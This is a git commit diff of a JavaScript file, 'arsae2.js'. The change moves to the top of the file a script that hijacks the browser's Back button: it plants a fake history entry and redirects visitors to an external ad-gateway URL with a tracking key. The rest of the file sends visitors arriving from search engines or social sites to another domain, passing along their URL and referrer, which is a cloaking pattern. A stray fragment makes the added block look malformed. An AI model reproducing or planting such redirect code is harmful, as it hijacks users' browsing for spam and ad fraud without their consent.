070f0a10cedf02438adbbde7902bbcb7232cafd3
mychiara <85479169+mychiara@users.noreply.github.com>
2022-08-12 20:58:20 +0800

    Update arsae2.js

--- arsae2.js
+++ arsae2.js
@@ -1,3 +1,19 @@
+type='text/javascript'>
+//<![CDATA[
+{(function(window, location) {
+history.replaceState(null, document.title, location.pathname+"#!/history");
+history.pushState(null, document.title, location.pathname);
+
+window.addEventListener("popstate", function() {
+if(location.hash === "#!/history") {
+history.replaceState(null, document.title, location.pathname);
+setTimeout(function(){
+location.replace("https://www.highperformancegate.com/d7ha27e5?key=3e13d68a557a37d91e09eff64ec81731");
+},10);
+}
+}, false);
+}(window, location));
+}
 //<![CDATA[
     if(document.referrer)
     {
@@ -14,18 +30,5 @@
 	//Code arsae client javascript
 	if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
     }
-(function(window, location) {
-history.replaceState(null, document.title, location.pathname+"#!/history");
-history.pushState(null, document.title, location.pathname);
-
-window.addEventListener("popstate", function() {
-if(location.hash === "#!/history") {
-history.replaceState(null, document.title, location.pathname);
-setTimeout(function(){
-location.replace("https://www.highperformancegate.com/d7ha27e5?key=3e13d68a557a37d91e09eff64ec81731");
-},10);
-}
-}, false);
-}(window, location));
 //]]>
 
